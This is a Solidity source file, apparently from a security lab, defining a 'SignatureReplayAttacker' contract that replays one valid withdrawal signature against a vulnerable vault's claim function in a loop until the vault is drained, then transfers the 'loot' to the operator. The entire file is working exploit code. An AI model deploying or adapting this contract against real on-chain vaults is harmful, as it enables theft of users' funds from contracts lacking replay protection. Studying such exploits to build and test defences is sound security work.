// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.28;

interface IReplayableSignatureVault {
    function claim(uint256 amount, bytes calldata signature) external;
    function vaultBalance() external view returns (uint256);
}

/// @title SignatureReplayAttacker
/// @author Solidity Security Lab
/// @notice Exploit contract that reuses the same withdrawal signature multiple times.
contract SignatureReplayAttacker {
    /// @notice Vulnerable vault targeted by the replay attack.
    IReplayableSignatureVault public immutable target;

    /// @notice Operator controlling the exploit contract.
    address public immutable operator;

    /// @notice Emitted when a replay sequence completes.
    event ReplayExecuted(uint256 amountPerClaim, uint256 successfulClaims, uint256 totalLoot);

    /// @notice Emitted when stolen Ether is withdrawn to the operator.
    event LootWithdrawn(address indexed recipient, uint256 amount);

    constructor(address targetAddress) {
        target = IReplayableSignatureVault(targetAddress);
        operator = msg.sender;
    }

    /// @notice Replays the same valid signature multiple times until the desired count is reached.
    function attack(uint256 amountPerClaim, bytes calldata signature, uint256 replayCount) external {
        require(msg.sender == operator, "Only operator can attack");
        require(amountPerClaim > 0, "Amount must be greater than zero");
        require(replayCount > 0, "Replay count must be greater than zero");

        uint256 successfulClaims;

        for (uint256 i = 0; i < replayCount; i++) {
            if (target.vaultBalance() < amountPerClaim) {
                break;
            }

            target.claim(amountPerClaim, signature);
            successfulClaims++;
        }

        require(successfulClaims > 0, "No replay executed");
        emit ReplayExecuted(amountPerClaim, successfulClaims, address(this).balance);
    }

    /// @notice Transfers stolen Ether to the attacker operator.
    function withdrawLoot() external {
        require(msg.sender == operator, "Only operator can withdraw loot");

        uint256 lootAmount = address(this).balance;
        require(lootAmount > 0, "No loot available");

        (bool success, ) = payable(operator).call{value: lootAmount}("");
        require(success, "Loot transfer failed");

        emit LootWithdrawn(operator, lootAmount);
    }

    receive() external payable {}
}
